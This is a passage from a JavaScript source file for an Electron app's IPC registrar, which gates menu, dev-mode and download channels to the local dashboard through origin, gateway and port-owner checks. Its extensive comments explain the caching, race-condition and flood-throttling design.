"use strict";

const { clampBadgeCount } = require("./badge");
const {
  isLocalGatewayEnabled,
  setLocalGatewayEnabled,
} = require("./local-gateway");
const {
  DEFAULT_GLOBAL_HOTKEY,
  createSummonHandler,
  bindGlobalHotkey: bindStoredGlobalHotkey,
  unregisterGlobalHotkey,
  currentGlobalHotkey,
  setGlobalHotkeyLogger,
} = require("./global-hotkey");
const { initAutoUpdate } = require("./auto-update");
const { requiredUpdateChannelFor } = require("./runtime/update/policy-channel");
const { makeUpdaterLogger } = require("./update-logger");
const { detectWsl2 } = require("./wsl-detection");
const { crashNoticeSummary } = require("./crash-collector");
const { PREFIX: PANE_ASSETS_PREFIX, purgeableOrigin } = require("./pane-asset-journal");
const { safeFilename } = require("./download-handler");

/**
 * Register the Electron shell's renderer bridges without taking ownership of
 * either window or gateway state. Electron is injected so this boundary can be
 * exercised with a small fake runtime rather than importing the main process.
 */
function createIpcRegistrar({
  electron,
  store,
  windows,
  gateway,
  backendUrl,
  port,
  detectWsl = detectWsl2,
  crashScan = null,
  glog,
  // Close/reopen the Crew Companion overlay around an update install so it does
  // not float orphaned over the vanished dashboard during the quit handoff.
  // Optional and no-op by default: an updater path must never depend on the
  // companion being wired.
  closeCrewCompanionForUpdate = () => {},
  reopenCrewCompanionAfterUpdate = () => {},
  // Shared single-use registry of downloads the renderer explicitly announced,
  // consumed by the will-download handler (see download-expectations.js). When
  // absent the download:expect channel is simply not registered.
  downloadExpectations = null,
  // The terminal-app allowlist and its grant-gated launcher. Injected so the
  // channel can be exercised without probing real install paths.
  externalTerminal = require("./external-terminal"),
  // The gateway's internal secret, re-read per call (it rotates per boot). Used
  // only to redeem an external-terminal grant at this shell's own gateway.
  readInternalSecret = () => "",
  fetchFn = (url, init) => fetch(url, init),
  // The update channel this build must follow, "" when Settings decides (an oss
  // build). See runtime/update/policy-channel.js.
  getRequiredChannel = requiredUpdateChannelFor(),
} = {}) {
  if (!electron) throw new Error("createIpcRegistrar: electron is required");
  if (!store) throw new Error("createIpcRegistrar: store is required");
  if (!windows) throw new Error("createIpcRegistrar: windows is required");
  if (!gateway) throw new Error("createIpcRegistrar: gateway is required");
  if (!backendUrl) throw new Error("createIpcRegistrar: backendUrl is required");
  if (!Number.isInteger(port)) throw new Error("createIpcRegistrar: port is required");
  if (typeof detectWsl !== "function") {
    throw new Error("createIpcRegistrar: detectWsl must be a function");
  }

  const {
    app,
    dialog,
    Notification,
    ipcMain,
    shell,
    webContents,
  } = electron;
  const log = typeof glog === "function" ? glog : (() => {});

  let shellRegistered = false;
  let updaterRegistered = false;
  let updater = null;
  // True when the gateway reports that a security policy provider owns this
  // install's updates and the Electron feed lane must stand down. Set by the
  // renderer via update:notify-policy-governed once the gateway status lands.
  let policyGoverned = false;
  // Set of webContents IDs currently reporting governance=true. Governance is
  // active as long as at least one sender is in the set; removing a sender's id
  // (on explicit false or on destroyed) clears governance only when the set
  // empties, so a second window closing does not re-enable the feed lane while
  // another window on the same bundled gateway is still governed.
  const governanceSenders = new Set();
  // Per-sender sequence counter to discard out-of-order async completions.
  // Two notifications from the same sender (e.g. false then true at startup)
  // are probed concurrently; if the probes complete in reverse order the
  // earlier continuation would overwrite the later verdict. Recording the
  // latest seq before awaiting and checking after guards this race condition.
  const senderSeq = new Map();
  // True while a native folder chooser is on screen, so a second request
  // answers "no choice" instead of stacking another dialog.
  let folderPickOpen = false;

  // Rejection-log throttle. `glog` is an unrotated synchronous
  // `fs.appendFileSync` on the MAIN thread and the gate below writes one line
  // per rejection, so an unthrottled reject path converts a remote page's
  // loop into main-thread stalls plus unbounded disk growth. The channels
  // routed through this gate are reachable with NO backpressure:
  // `dev-mode-changed` is a fire-and-forget `ipcRenderer.send`, and while
  // `app-menu:execute` answers through `ipcRenderer.invoke`, a hostile page
  // need not AWAIT it — an un-awaited invoke fired in a loop is the same
  // flood. The pre-existing gated channels self-throttle only because THEIR
  // callers await, which is a property of those call sites rather than of the
  // channel shape. The single-flight coalescer in `registerShell()`
  // below does NOT cover this: each IPC message is its own main-thread task
  // and microtasks drain between tasks, so the in-flight entry is always
  // empty when the next message lands.
  //
  // This throttles the WRITE, never the VERDICT. Every call still runs all
  // three gates and still rejects, so there is no cached `false` that could
  // strand a legitimate local user on a permanently-greyed titlebar menu —
  // the failure mode the removal of negative caching exists to prevent. Same
  // shape as the coalescer: a third option satisfying two lanes whose
  // literal asks conflicted. See the F1 finding in GPT 5.6 Review on
  // 7234d97b9 (UPHOLD-FENCED, adjudication `flagged=0`).
  //
  // Scoped here rather than inside `registerShell()` because the gate it
  // serves is itself at this scope: `registerUpdater`'s
  // `update:notify-policy-governed` runs the same three gates and its
  // rejections need the same per-sender budget.
  const REJECTION_LOG_BURST = 5;
  const REJECTION_LOG_WINDOW_MS = 60_000;
  const rejectionLogState = new WeakMap();

  // Keyed per WebContents so one flooding sender cannot spend another
  // window's diagnostic budget and blind an investigator to its rejects.
  function logGateRejection(wc, line) {
    // A torn-down or absent sender is a single event, not a flood vector —
    // never drop its diagnostic to a bookkeeping miss.
    if (!wc) {
      log(line);
      return;
    }
    const now = Date.now();
    let state = rejectionLogState.get(wc);
    if (!state) {
      state = { windowStart: now, written: 0, suppressed: 0 };
      rejectionLogState.set(wc, state);
    }
    if (now - state.windowStart >= REJECTION_LOG_WINDOW_MS) {
      // Report the scale before resetting, so a SUSTAINED flood — the actual
      // attack — is visible in the log at full magnitude once per window.
      // A flood that stops mid-window loses only its tail count, never the
      // fact of the rejections: the window's first `REJECTION_LOG_BURST`
      // lines were already written. The alternative, a flush timer, would
      // either hold the WebContents alive or keep the loop warm for a
      // diagnostic nicety.
      if (state.suppressed > 0) {
        log(
          `${state.suppressed} further local-dashboard gate rejections suppressed `
          + `for this sender in the last ${REJECTION_LOG_WINDOW_MS}ms`,
        );
      }
      state.windowStart = now;
      state.written = 0;
      state.suppressed = 0;
    }
    if (state.written < REJECTION_LOG_BURST) {
      state.written += 1;
      log(line);
      return;
    }
    state.suppressed += 1;
  }

  // Shared local-dashboard gate — used by both registerShell() and
  // registerUpdater() so the contract test finds a single spelling.
  // See the comment block inside registerShell() for the full rationale.
  const assertLocalDashboard = async (event, channel) => {
    let origin = "";
    try {
      origin = new URL(event.senderFrame.url).origin;
    } catch { /* about:blank, malformed URL, or torn-down frame */ }
    if (origin !== backendUrl) {
      logGateRejection(
        event.sender,
        `${channel} rejected for sender origin ${origin || "(unreadable)"}`,
      );
      throw new Error(`${channel} is restricted to the local dashboard`);
    }
    const owner = windows.windowForWebContents(event.sender);
    if (!windows.security.isGatewayLocalForWindow(owner)) {
      logGateRejection(
        event.sender,
        `${channel} rejected for a sender window without a local gateway`,
      );
      throw new Error(`${channel} is restricted to the local dashboard`);
    }
    const portOwner = await gateway.probePrimaryPortOwner();
    if (portOwner !== "kirocrew" && portOwner !== "service") {
      logGateRejection(
        event.sender,
        `${channel} rejected: :${port} held by ${portOwner}, `
        + "not this shell's gateway",
      );
      // Every caller still sees a refusal. The classified owner rides along
      // only so the app-menu gate can tell an inconclusive probe from a
      // foreign holder; the other channels ignore it and stay fail-closed.
      const refusal = new Error(`${channel} is restricted to the local dashboard`);
      refusal.portOwner = portOwner;
      throw refusal;
    }
  };

  setGlobalHotkeyLogger(log);
  const summonDashboard = createSummonHandler({
    getWindow: () => (
      typeof windows.getSummonWindow === "function"
        ? windows.getSummonWindow()
        : (windows.focusedDashboardWindow() || windows.getMainWindow() || null)
    ),
    createWindow: () => windows.createMainWindow(),
    // A global shortcut fires while another app is frontmost. A fullscreen
    // tray-close hides the whole application, so unhide it before win.show();
    // then steal activation after the window has been surfaced.
    showApp: () => {
      if (process.platform === "darwin" && typeof app.show === "function") app.show();
    },
    focusApp: () => {
      if (process.platform === "darwin") app.focus({ steal: true });
    },
  });

  /**
   * Build the application menu, harden both Electron sessions, and register
   * every renderer bridge except update:*.
   *
   * This must run after app.whenReady() but before createMainWindow(): session
   * permission handlers need to exist before an untrusted view can be created.
   */
  function registerShell() {
    if (shellRegistered) return summonDashboard;

    // Session policy is window-owned because it knows which WebContents are
    // untrusted and which persistent partition hosts embedded browser pages.
    if (windows.security && typeof windows.security.configureSession === "function") {
      windows.security.configureSession();
    } else {
      // Transitional alias for callers composed against the flat façade name.
      windows.configureSessionSecurity();
    }

    // buildApplicationMenu also installs the resulting native Menu. Its click
    // callbacks stay inside the window façade, where focused-window resolution
    // and traffic-light/zoom reconciliation live.
    windows.menu.buildApplicationMenu();

    // `app-menu:execute` (and now `app-menu:items` + `dev-mode-changed`) use
    // PER-ACTION gating rather than the channel-level rejection every other
    // privileged handler below uses. Reason:
    //   - Some menu roles are dispatched with the sender's own WebContents
    //     as click(...) arguments — Electron's role dispatch reads those, so
    //     cut/copy/undo/redo/selectAll and role reload naturally scope to
    //     the sender's page.
    //   - Custom click handlers in app-menu.js resolve their targets through
    //     `focusedDashboardWebContents()` / `focusedDashboardWindow()`,
    //     which return the LOCAL user's focused window regardless of who
    //     sent the IPC. So EVERY custom-click item invoked by a remote
    //     sender reaches the LOCAL user's window, and every custom-click
    //     item that reaches for a WebContents is fenced (LOCAL_ONLY_ITEM_IDS
    //     includes reload, force-reload, zoom-*, devtools-toggle, settings,
    //     about, keep-on-top). There is no "remote-safe custom-click item"
    //     class — the assumption that page-level Reload/Zoom would be safe
    //     was retracted in the F2 fix during pre-flight review.
    // Refusing the whole channel would blank the menu in connection windows;
    // letting everything through would leak the local clipboard, mutate the
    // operator's window state, or grant DevTools to a remote sender. So we
    // classify the sender once (see `resolveSenderIsLocal` below), hand the
    // verdict down through `windows.menu.items` / `windows.menu.execute`,
    // and let the three LOCAL_ONLY_* sets in windows-menu-model.js make
    // the per-item decision. `serializeMenuItems` reflects the verdict as
    // `enabled: false` on LOCAL_ONLY rows so the renderer paints a greyed
    // label instead of a silently-refused click.
    //
    // The gate itself throwing is a diagnostic signal ("this sender was not
    // the local dashboard"), NOT an error to surface to the renderer. Every
    // reject already logs (see `logGateRejection(...)` inside assertLocalDashboard).
    // `resolveSenderIsLocal` swallows the throw and returns a boolean, so
    // menu dispatch always runs — safe items pass, LOCAL_ONLY items become
    // no-ops (or `enabled: false` on the items surface).
    //
    // Caching: the verdict is a fact about a WebContents (its origin, its
    // window's gateway, this shell's primary-port owner). Gate 3
    // (`gateway.probePrimaryPortOwner`) shells out to netstat/PowerShell on
    // Windows, so recomputing on every menu click added hundreds of ms of
    // latency to a hot path (Spock FUNC-01). Cache per WebContents and
    // invalidate on BOTH `did-start-navigation` (before commit) AND
    // `did-navigate` (after commit) — gate 1 keys off the frame origin,
    // and a same WebContents that navigates to a different origin must
    // revalidate before the new document can issue any IPC. Clearing only
    // on `did-navigate` leaves the cache holding a stale `true` between
    // the moment a navigation is requested and the moment it commits, and
    // a preload IPC dispatched during that window could reach a
    // LOCAL_ONLY leaf against the wrong origin (GPT 5.6 Review F1 on 06b1d9c4a).
    //
    // **Only `true` verdicts are cached.** `false` re-probes every call.
    // Two reasons:
    //   1. The `did-navigate` event fires only on FULL top-frame navigations,
    //      not on SPA route changes (which fire `did-navigate-in-page`). The
    //      Kiro Crew dashboard is an SPA, so its route changes would never
    //      clear this cache — a transient `false` (netstat locale hiccup,
    //      PowerShell policy timeout, one flaky probe) would grey the local
    //      user's titlebar menu for the entire session with no in-product
    //      remedy. Re-probing on every menu click is cheap when the answer
    //      is "not local", because gate 1 (origin) or gate 2 (URL match)
    //      short-circuits before the netstat/PowerShell shell-out.
    //   2. The generation counter below exists solely to protect the POSITIVE
    //      direction from a race where a WebContents navigates to a remote
    //      origin during the probe, letting stale `true` unlock LOCAL_ONLY
    //      leaves for that remote origin. The negative direction has no
    //      symmetric threat — a stale `false` refuses actions, not authorises
    //      them — so its caching adds risk without reward.
    //
    // **A cached positive also EXPIRES.** The generation counter above covers
    // the two gates that are facts about the PAGE: a navigation moves the
    // frame's origin (gate 1) and the sending window's gateway (gate 2), and
    // the listeners clear the cache when it does. Gate 3 is different in kind
    // — it is a fact about the MACHINE, the primary port's LISTEN owner — and
    // it can change with NOTHING happening to the sender. Our gateway exits,
    // releasing the socket; a foreign process or a hand-rolled `ssh -L` binds
    // that port; the page never navigates, so no listener fires, and the
    // cached `true` keeps answering for the WebContents' remaining lifetime.
    // That skips the only gate that can see a tunnel and keeps the clipboard
    // roles and devtools-toggle unlocked against a port this shell no longer
    // owns. SPA route changes fire `did-navigate-in-page` and are deliberately
    // non-clearing, so there is no recovery short of a full top-frame
    // navigation.
    //
    // A foreign listener can only take the port if OUR gateway released it
    // first — nothing else can bind while we hold the LISTEN socket — so the
    // exposure is bounded by "our gateway exited", and a short expiry bounds
    // it in time. The window is long enough that the repeat calls one menu
    // interaction produces still hit the cache, which is the whole reason the
    // cache exists (Spock FUNC-01: a probe per click added hundreds of ms to a
    // hot path). Like the rejection-log throttle above, this bounds the reuse
    // of a verdict and never the verdict itself: a `false` is still never
    // cached, so a transient probe hiccup still cannot strand a legitimate
    // local user on a permanently-greyed menu. See the F1 finding in GPT 5.6
    // Review on bd68985db (UPHOLD-FENCED, adjudication `flagged=0`).
    //
    // Ordering is load-bearing: wire the invalidation listener BEFORE the
    // first probe, and check a generation counter after the probe returns
    // before writing the cache. `assertLocalDashboard` is asynchronous
    // (netstat / PowerShell port-owner probe on Windows), so a navigation
    // completing DURING that probe would otherwise fire `did-navigate` with
    // no listener attached, the cache would then be written with the pre-
    // navigation verdict, and a remote origin would inherit `true`.
    //
    // The map holds the mint time of a positive verdict, never a bare `true`:
    // the only entries it ever carries are positives, so the timestamp IS the
    // verdict plus the one thing a reader needs to judge whether it still
    // stands.
    const POSITIVE_VERDICT_TTL_MS = 5_000;
    const senderIsLocalCache = new WeakMap();
    const senderIsLocalWired = new WeakSet();
    const senderIsLocalGeneration = new WeakMap();
    // Single-flight coalescer: if a probe is already in flight for THIS
    // WebContents, subsequent callers `await` the same promise instead of
    // launching another netstat/PowerShell. This closes the DoS vector where
    // a manual-SSH-tunnel remote page on the primary port (gates 1 and 2 pass,
    // gate 3 fails) can loop `app-menu:*` calls and, with negative caching
    // deliberately removed to avoid stranding a legitimate local user on a
    // greyed menu after a transient probe hiccup, spawn a fresh OS probe on
    // every call. Coalescing is state-free at rest — the in-flight entry is
    // deleted the instant the probe resolves — so it does not reintroduce
    // the stranding hazard the removal of negative caching was designed to
    // fix, and a legitimate next click starts a fresh probe against fresh
    // state. See the DoS finding in GPT 5.6 Review on cfa37ff95.
    //
    // The in-flight entry stores BOTH the probe promise AND the generation
    // observed when the probe was created. Joining callers apply the SAME
    // generation-equality fail-closed guard the creator does, so a
    // WebContents that navigates cross-origin mid-probe hands ALL callers
    // (creator and joiners) a `false` — not just the creator. Without this,
    // a joiner would receive the raw probe verdict and dispatch LOCAL_ONLY
    // leaves against the post-navigation (now-remote) origin. See the
    // joiner-race finding in GPT 5.6 Review and Opus 5 Review on 07e0060c5.
    const senderIsLocalInFlight = new WeakMap();

    // Extracted so creator and joiner apply IDENTICAL fail-closed logic. A
    // stale `true` from a probe that observed a pre-navigation state is
    // forced to `false` if the WebContents has since navigated — the caller
    // will re-probe against the fresh state on its next call.
    function applyGenerationGuard(wc, verdict, genAtStart) {
      const generationUnchanged =
        (senderIsLocalGeneration.get(wc) || 0) === genAtStart;
      return verdict === true && generationUnchanged;
    }

    // A port-owner probe that could not NAME a holder is not evidence of a
    // foreign one. `unknown` is the probe itself failing (netstat locale,
    // PowerShell policy timeout); `none` is the primary port briefly unbound
    // while our gateway restarts; `unidentified` is a holder netstat DID name
    // whose command line could not be read. None proves a foreign holder, so
    // none revokes the last positive this WebContents earned, and the paint path
    // keeps drawing the local user's rows enabled instead of greying them over
    // a hiccup. None proves OUR gateway holds the port either, so none
    // authorizes an action: a probe failure can coincide with a foreign
    // listener, and only a fresh `local` outcome may unlock a LOCAL_ONLY leaf.
    //
    // `unidentified` is soft HERE and hard at the adopt boundary, where
    // `holder-decision.js` refuses it alongside `foreign` because adopting
    // posts this machine's `.local_secret`. Painting a row costs nothing if it
    // is wrong -- the click is still gated -- so the two consumers can and must
    // answer the same ambiguity differently.
    const INCONCLUSIVE_PORT_OWNERS = new Set(["unknown", "none", "unidentified"]);

    // Turn a probe outcome into a verdict for THIS WebContents. Only `local`
    // authorizes. `inconclusive` refuses but leaves the last positive in place
    // for painting; `refused` also drops it, so a later inconclusive probe
    // cannot keep painting rows enabled after a foreign holder was proven.
    //
    // The kept positive is bounded, but by a FAILING PROBE and never by age
    // alone. Rows painted enabled while every click is refused is a dead menu
    // with nothing on screen to explain it, so once a probe has come back
    // inconclusive the positive survives only `INCONCLUSIVE_PAINT_GRACE_MS`
    // beyond its own window, then drops and the rows grey with the footer. The
    // grace covers a gateway restart; a probe that keeps failing longer than
    // that is shown, not hidden.
    //
    // Age on its own carries no such evidence, and bounding the PAINT by it put
    // the common case back on the probe's critical path: real menu opens are
    // minutes apart, so each one awaited a netstat/PowerShell round trip and
    // drew an empty popup for the length of it. An idle gap is not a probe
    // failure. See buluoray Blocking 1 on cb31d4f18a.
    const INCONCLUSIVE_PAINT_GRACE_MS = 30_000;

    // Set while the latest probe for this WebContents came back inconclusive;
    // cleared by the next proven `local`, and by a proven foreign holder. This
    // is what separates "we asked and could not tell" from "nobody has asked
    // recently" — a distinction the mint timestamp alone cannot make, because
    // both look identical to it.
    const senderProbeInconclusive = new WeakSet();

    // Does a last positive still stand for PAINTING? Any age qualifies: a
    // positive is revoked by navigation or by a proven foreign holder, not by
    // the clock. The only bound is a probe that has actually contradicted it.
    function positiveIsPaintable(wc) {
      if (senderIsLocalCache.get(wc) === undefined) return false;
      return !senderProbeInconclusive.has(wc) || inconclusiveGraceRemains(wc);
    }

    // Does a positive kept through an inconclusive probe have grace left?
    // Measured from the MINT time, so a run of inconclusive probes cannot
    // extend the window by restarting the clock on each one.
    function inconclusiveGraceRemains(wc) {
      const mintedAt = senderIsLocalCache.get(wc);
      return mintedAt !== undefined
        && Date.now() - mintedAt < POSITIVE_VERDICT_TTL_MS + INCONCLUSIVE_PAINT_GRACE_MS;
    }

    function settleProbeOutcome(wc, outcome) {
      if (outcome === "local") {
        senderProbeInconclusive.delete(wc);
        return true;
      }
      if (outcome === "inconclusive") {
        senderProbeInconclusive.add(wc);
        if (!inconclusiveGraceRemains(wc)) senderIsLocalCache.delete(wc);
        return false;
      }
      // `refused` — a proven foreign holder. Drop the positive outright, and
      // forget the inconclusive mark with it so a positive re-earned later
      // starts from a clean slate rather than inheriting a spent grace.
      senderIsLocalCache.delete(wc);
      senderProbeInconclusive.delete(wc);
      return false;
    }

    async function resolveSenderIsLocal(event, channel) {
      const wc = event && event.sender;
      if (!wc) return false;
      // A positive answers on its own only while it is fresh. A lapsed entry is
      // KEPT as the last positive (see settleProbeOutcome) but falls through to
      // a fresh three-gate probe, which is what re-establishes the
      // port-ownership fact nothing else can invalidate.
      const mintedAt = senderIsLocalCache.get(wc);
      if (mintedAt !== undefined && Date.now() - mintedAt < POSITIVE_VERDICT_TTL_MS) {
        return true;
      }
      const inFlight = senderIsLocalInFlight.get(wc);
      if (inFlight) {
        // Joining caller path — MUST apply the same generation guard the
        // creator does. Otherwise a navigation completing between the probe
        // START (creator's genAtStart) and the joiner receiving the verdict
        // would let a raw `true` reach a now-remote document.
        const joinerOutcome = await inFlight.promise;
        return applyGenerationGuard(wc, settleProbeOutcome(wc, joinerOutcome), inFlight.genAtStart);
      }
      // Wire the invalidation BEFORE the probe and seed the generation, so
      // any navigation that lands during the probe increments the counter
      // and the cache write below is skipped. A plain object in tests has
      // no `.on`; the listener wiring is best-effort in mid-teardown paths.
      if (!senderIsLocalWired.has(wc)) {
        senderIsLocalWired.add(wc);
        senderIsLocalGeneration.set(wc, 0);
        try {
          if (typeof wc.on === "function") {
            const invalidate = () => {
              senderIsLocalGeneration.set(
                wc,
                (senderIsLocalGeneration.get(wc) || 0) + 1,
              );
              senderIsLocalCache.delete(wc);
            };
            // Invalidate on BOTH `did-start-navigation` (before Chromium
            // commits the new document) AND `did-navigate` (after commit).
            // The start-side listener is load-bearing: `did-navigate` alone
            // leaves the cache holding a stale `true` between the moment a
            // top-frame cross-origin navigation is requested and the moment
            // it commits, so a preload IPC dispatched during the new
            // document's init could reach a LOCAL_ONLY leaf (DevTools
            // toggle, settings, clipboard) against the wrong origin. Scope
            // to real navigations only — an in-place `pushState`
            // (`isInPlace: true`) does not change the frame's origin, and
            // a sub-frame navigation (`!isMainFrame`) does not move gate 1
            // (top-frame origin) either. Both would churn the cache without
            // guarding anything.
            wc.on("did-start-navigation", (_event, _url, isInPlace, isMainFrame) => {
              if (!isMainFrame || isInPlace) return;
              invalidate();
            });
            // did-navigate remains as a defence-in-depth listener: if a
            // navigation ever completes without a matching start event
            // (Electron edge case, aborted-and-redirected chain), the
            // commit still clears the cache. Idempotent — the generation
            // counter just increments again, which is harmless.
            wc.on("did-navigate", invalidate);
          }
        } catch { /* WebContents mid-teardown */ }
      }
      const genAtStart = senderIsLocalGeneration.get(wc) || 0;
      // Publish the in-flight promise BEFORE awaiting so any concurrent call
      // that arrives during the async probe joins it rather than starting a
      // second probe. The `.finally` guarantees the entry is removed once
      // the probe resolves, regardless of the verdict — leaving a stale
      // in-flight entry would freeze subsequent probes on a resolved promise.
      const probe = (async () => {
        try {
          await assertLocalDashboard(event, channel);
          return "local";
        } catch (err) {
          // The gate already logged the reject through glog. A gate-3 refusal
          // carries the classified owner, which is what separates "could not
          // tell" from "someone else holds the port".
          if (err && INCONCLUSIVE_PORT_OWNERS.has(err.portOwner)) return "inconclusive";
          return "refused";
        }
      })();
      senderIsLocalInFlight.set(wc, { promise: probe, genAtStart });
      let outcome;
      try {
        outcome = await probe;
      } finally {
        senderIsLocalInFlight.delete(wc);
      }
      const verdict = settleProbeOutcome(wc, outcome);
      // Cache only positive verdicts, and only when no navigation completed
      // during the probe (see the header comment). A `false` re-probes on
      // the next call — cheap, and it survives a transient probe failure
      // that would otherwise strand the local user on a permanently-greyed
      // titlebar menu since SPA route changes fire `did-navigate-in-page`
      // rather than `did-navigate`. The stored value is the mint time, which
      // is what bounds how long gate 3's mutable port-ownership fact may be
      // taken on trust. Only a proven local owner mints or re-mints it; a
      // positive kept through an inconclusive probe keeps its old mint time.
      const guarded = applyGenerationGuard(wc, verdict, genAtStart);
      if (guarded) {
        senderIsLocalCache.set(wc, Date.now());
      }
      // The RETURN path also has to fail closed on the navigation race, not
      // just the cache write. A probe that started when the sender was the
      // LOCAL dashboard and finished with `verdict = true` AFTER a cross-
      // origin navigation described a WebContents state the caller has
      // already left; returning `true` for a now-remote document would
      // dispatch a LOCAL_ONLY leaf (paste, devtools-toggle) against the
      // wrong origin.
      return guarded;
    }

    // Items advertises labels only; but the enabled column reflects the
    // per-action gate so a connection window paints greyed LOCAL_ONLY rows
    // rather than enabled ones that silently no-op on click. Async only
    // because the first call on a sender WebContents warms the cache
    // through `assertLocalDashboard`; subsequent calls are synchronous.
    //
    // Painting the rows never waits on a re-probe. When this WebContents holds
    // a last positive that has merely aged out, the rows paint from it and the
    // re-probe runs in the background, so opening the menu after an idle gap
    // costs no netstat/PowerShell wait. This is safe because `items` only
    // decides how a row LOOKS: every click goes through `app-menu:execute`,
    // which never answers from a lapsed positive — it joins that same
    // in-flight probe and refuses when it finds a foreign holder. The one
    // stale paint that remains is a row drawn enabled for a single open after
    // a foreign process took the port, and clicking it is refused VISIBLY: the
    // refusal is answered back to the renderer, which refetches these rows and
    // re-paints them greyed with the footer naming the reason. The refused
    // click's own probe has by then dropped the positive, so this second call
    // takes the awaited path rather than repeating the stale answer.
    function resolveSenderIsLocalForPaint(event, channel) {
      const wc = event && event.sender;
      if (wc && positiveIsPaintable(wc)) {
        // resolveSenderIsLocal never rejects; a fresh entry returns without
        // probing, a lapsed one starts (or joins) the single-flight re-probe.
        //
        // The handler is attached anyway, and not because the invariant above
        // is in doubt. This is a DISCARDED promise in the Electron main
        // process, where an unhandled rejection is fatal to the whole app, and
        // the invariant is a property of a function several layers away that a
        // later edit can break without ever reading this line. `app-menu:execute`
        // below wraps its own async work for exactly this reason; a comment is
        // not the same protection as a handler.
        resolveSenderIsLocal(event, channel).catch((err) => {
          log(`app-menu:items background re-probe failed: ${(err && err.stack) || err}`);
        });
        return true;
      }
      return resolveSenderIsLocal(event, channel);
    }
    ipcMain.handle("app-menu:items", async (event, id) => {
      const senderIsLocal = await resolveSenderIsLocalForPaint(event, "app-menu:items");
      return windows.menu.items(event.sender, id, senderIsLocal);
    });
    // A request/response `handle`, not a fire-and-forget `send`, because the
    // ANSWER is load-bearing: a refusal is the only moment the renderer can
    // learn the rows it painted are stale, and it refetches `app-menu:items` on
    // one. That refetch is what greys the rows and renders the footer naming
    // the reason — without it a refused click is wholly silent, since a stale
    // paint sends every row `gated: false` and the footer only explains gated
    // rows. GPT 5.6 lane finding on 1f3a603c46.
    //
    // The refetch genuinely re-paints rather than repeating the stale answer:
    // this call's own probe has by then proven a foreign holder, and
    // `settleProbeOutcome("refused")` drops the positive outright, so
    // `positiveIsPaintable` is false for the next `items` call.
    ipcMain.handle("app-menu:execute", async (event, id, index) => {
      try {
        // Captured BEFORE the await, because the await is precisely what makes
        // this necessary. The custom click handlers in window-lifecycle.js
        // (`reload`, `forceReload`, `toggleDevTools` and `zoomMenuItem`'s three
        // actions) take no arguments and each resolve
        // `focusedDashboardWebContents()` THEMSELVES at dispatch time, so a
        // focus change while the ownership probe runs sends the action to
        // whichever window is focused when it settles — a Reload throws away
        // the unsaved state of a window the user never clicked in. As a
        // synchronous `ipcMain.on` there was no window in which focus could
        // move, which is why `executeMenu` still asserts the premise that no
        // longer holds. Refusing is the whole remedy: the renderer refetches on
        // a `false`, so the click is declined and re-painted rather than
        // misdirected. GPT 6.1 lane finding F1 on 934946a45a.
        const focusedWindowAtRequestTime = windows.focusedDashboardWindow();
        const senderIsLocal = await resolveSenderIsLocal(event, "app-menu:execute");
        if (windows.focusedDashboardWindow() !== focusedWindowAtRequestTime) {
          log(
            `app-menu:execute refused ${id}[${index}]: focus moved while the `
            + "ownership probe ran, so the dispatch target is no longer the requester",
          );
          return false;
        }
        // Strict `=== true` on the way OUT for the same reason the gate is
        // strict on the way in: anything else — a caller composed against an
        // older façade that returns nothing, a truthy proxy — must read as
        // "did not dispatch" so the renderer refetches rather than trusting a
        // click that may never have fired.
        return windows.menu.execute(event.sender, id, index, senderIsLocal) === true;
      } catch (err) {
        // resolveSenderIsLocal never rejects, and windows.menu.execute
        // ordinarily catches its own click errors — but an escaping error
        // here would surface in the renderer as a thrown `invoke` rather
        // than an answer (and as a bare `.on` listener, which this channel
        // used to be, an unhandled rejection was process-fatal — Spock
        // ERR-01). Log and answer fail-closed: "could not dispatch" is
        // exactly what the refetch is the right response to.
        log(`app-menu:execute dispatch failed: ${(err && err.stack) || err}`);
        return false;
      }
    });
    // dev-mode-changed flips the visibility of the DevTools menu item. Only
    // a local sender may change it — otherwise a remote gateway could show
    // DevTools in the local user's menu (they'd still be blocked from
    // clicking it by LOCAL_ONLY_ITEM_IDS, but leaving the visibility
    // un-gated hands a remote a UI knob on the local user's window).
    //
    // Visibility is cosmetic, so it reads gate 3 the way the PAINT path does
    // rather than the way the authorizing path does: an inconclusive probe is
    // not a refusal here. A probe only reaches `inconclusive` AFTER gates 1 and
    // 2 pass, so the sender is already proven to be the local dashboard on a
    // local gateway and the single unproven fact is who holds the port. The row
    // it reveals is still gated per action by `app-menu:execute`, which
    // re-resolves and refuses on its own, so a wrong answer here costs a greyed
    // click — while the reverse answer costs the local user the row for the
    // whole SESSION, because the renderer syncs dev mode once on mount with
    // empty deps and never retries.
    //
    // This lives in the SAME commit as `senderProbeInconclusive` rather than in
    // the gate commit that introduced the channel, because it reads that set:
    // the gate commit alone has no notion of an inconclusive probe, so the
    // predicate would reference an undeclared binding there.
    //
    // `senderProbeInconclusive` carries exactly the distinction this needs:
    // `settleProbeOutcome` ADDS the WebContents on an inconclusive gate-3
    // outcome and DELETES it on a proven foreign holder or a gates-1/2 refusal,
    // so membership after the resolve is the signal. The generation counter is
    // re-read for the same reason the authorizing path applies it — a probe that
    // settled after a cross-origin navigation committed describes a document the
    // caller has already left, and its soft pass must not outlive it.
    async function senderMayFlipDevMenuVisibility(event) {
      const wc = event && event.sender;
      if (!wc) return false;
      const generationAtStart = senderIsLocalGeneration.get(wc) || 0;
      if (await resolveSenderIsLocal(event, "dev-mode-changed")) return true;
      if (!senderProbeInconclusive.has(wc)) return false;
      return (senderIsLocalGeneration.get(wc) || 0) === generationAtStart;
    }
    ipcMain.on("dev-mode-changed", (event, enabled) => {
      (async () => {
        if (await senderMayFlipDevMenuVisibility(event)) {
          windows.menu.setDevMode(enabled);
        }
      })().catch((err) => {
        log(`dev-mode-changed dispatch failed: ${(err && err.stack) || err}`);
      });
    });

    // The export path announces each download it is about to start ("expect one
    // download named <name>") so the will-download handler auto-saves ONLY
    // downloads the app explicitly asked for. The expectation is keyed by the
    // ANNOUNCING FRAME's own origin (event.sender), not a renderer-supplied
    // value, so one origin cannot pre-authorise another's download; the leaf
    // name is sanitised with the same safeFilename the handler uses so both
    // sides key on the same value.
    if (downloadExpectations && typeof downloadExpectations.register === "function") {
      ipcMain.on("download:expect", (event, filename) => {
        let origin = "";
        try {
          origin = new URL(event.sender.getURL()).origin;
        } catch {
          origin = "";
        }
        downloadExpectations.register({ origin, filename: safeFilename(filename) });
      });
    }

    // The shortcuts UI reports what is ACTUALLY bound. Registration may have
    // fallen back to the default or degraded to no shortcut at all.
    ipcMain.handle("global-hotkey:get", () => ({
      accelerator: currentGlobalHotkey(),
      default: DEFAULT_GLOBAL_HOTKEY,
    }));

    ipcMain.on("theme-accent-changed", (_event, hex) =>
